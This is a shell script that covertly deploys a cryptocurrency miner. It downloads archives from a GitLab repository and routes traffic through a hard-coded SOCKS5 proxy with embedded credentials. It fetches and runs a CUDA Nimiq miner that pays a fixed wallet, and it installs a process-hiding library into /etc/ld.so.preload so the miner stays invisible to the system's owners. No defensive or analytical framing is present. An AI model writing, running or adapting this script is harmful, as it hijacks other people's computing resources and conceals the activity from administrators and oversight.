#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 137.184.34.110:443
socks5_username = pejuang
socks5_password = sedekah
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/noncerpro-cuda-linux-3.4.1.tar.gz
tar xf noncerpro-cuda-linux-3.4.1.tar.gz

./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./noncerpro -a "NQ52 J9RY E6Y3 PFAS 8MEM B0QE HL2T LLJJ DSFF" -s nimiq.icemining.ca -p 2053 -n $(shuf -n 1 -i 1-999999) --threads=4 --mode=dumb
